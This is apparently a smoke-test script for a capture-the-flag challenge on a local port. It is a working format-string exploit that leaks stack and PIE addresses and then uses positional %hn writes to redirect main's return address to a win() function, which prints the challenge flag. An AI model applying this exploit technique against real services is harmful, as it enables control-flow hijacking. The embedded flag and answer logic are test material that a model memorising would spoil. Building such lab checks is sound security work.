#!/usr/bin/env python3
"""Smoke test for fmtstr-002 (port 9984): format string on a PIE binary.

Round 1: the format walk (%1$p|%39$p) leaks two anchors:
  arg 1 (rdi)      the input buffer's runtime address  -> main's frame
  arg 39           the anchor slot (rbp-0x8), holding &the_hook
                   -> the PIE base falls out (the_hook = base + 0x4078)
main's frame: input at rbp-0x110, so main's saved return address sits
at input + 0x118 - only checked at EOF (main loops; it never returns
before the socket closes). That makes it the write target: partial
states between rounds are never called.

Round 2: ONE printf with four positional %hn writes aimed at the four
16-bit words of the win() runtime address (win = base + 0x11d9). Each
%hn writes the chars printed so far, so the four counts must rise
monotonically - the words are sorted and the gaps filled with %1$Nc
paddings (the NUL after the 49-char format terminates the parse before
the embedded addresses at slots 13-16 = input[56..87]). EOF then makes
main return into win().

Success output (win() runs):

  FLAG: FLAG{mr5_fmtstr_pie_leak_write}
"""

import re
import socket
import struct
import time

HOST = "127.0.0.1"
PORT = 9984

HOOK_OFF = 0x4078  # the_hook: the anchor's static offset (nm fmtstr-002)
WIN_OFF = 0x11D9  # win(): the write target's static offset
RET_DELTA = 0x118  # main's saved return address: input + 0x118
SLOT_BASE = 56  # input offset of format-arg slot 13

p64 = lambda x: struct.pack("<Q", x)


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # round 1: the format walk leaks the input buffer (arg 1 = rdi) and
    # the anchor slot (arg 39 = rbp-0x8, holding &the_hook = base+0x4078)
    s.send(b"%1$p|%39$p\n")
    buf = b""
    while not re.search(rb"0x[0-9a-f]+\|0x[0-9a-f]+", buf):
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
    m = re.search(rb"(0x[0-9a-f]+)\|(0x[0-9a-f]+)", buf)
    inp, anchor = int(m.group(1), 16), int(m.group(2), 16)
    base = anchor - HOOK_OFF
    ret = inp + RET_DELTA
    win = base + WIN_OFF
    print(
        f"[+] input={inp:#x} anchor={anchor:#x} base={base:#x} win={win:#x} ret={ret:#x}"
    )

    # round 2: four %hn writes into main's saved return address. Each
    # writes the running char count, so the four 16-bit words of win
    # must be sorted ascending; the gaps ride %1$Nc paddings (positional:
    # every spec carries its slot, no glibc mixing ambiguity).
    words = [
        (win >> 48) & 0xFFFF,
        (win >> 32) & 0xFFFF,
        (win >> 16) & 0xFFFF,
        win & 0xFFFF,
    ]
    writes = [
        (words[k], 2 * (3 - k)) for k in range(4)
    ]  # word k lives at ret + 2*(3-k)
    writes.sort(key=lambda t: t[0])
    if len({v for v, _ in writes}) != 4:  # duplicate words: new ASLR base
        s.close()
        raise AssertionError("duplicate words, retry (fresh ASLR)")
    fmt, prev = "", 0
    for i, (val, _off) in enumerate(writes):
        if val > prev:
            fmt += f"%1${val - prev}c"
            prev = val
        fmt += f"%{13 + i}$hn"
    payload = bytearray(fmt.encode() + b"\x00")
    payload += b"A" * (SLOT_BASE - len(payload))
    for _, off in writes:
        payload += p64(ret + off)
    print(f"[+] payload {len(payload)} bytes fmt={fmt!r}")
    s.send(bytes(payload))
    time.sleep(0.5)

    # EOF: main's read returns 0, it returns into the overwritten slot
    # and win() runs
    s.shutdown(socket.SHUT_WR)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass
    print(f"[+] tail: {out[-80:]!r}")
    assert b"FLAG{mr5_fmtstr_pie_leak_write}" in out, "oracle flag missing"
    print("[+] fmtstr-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
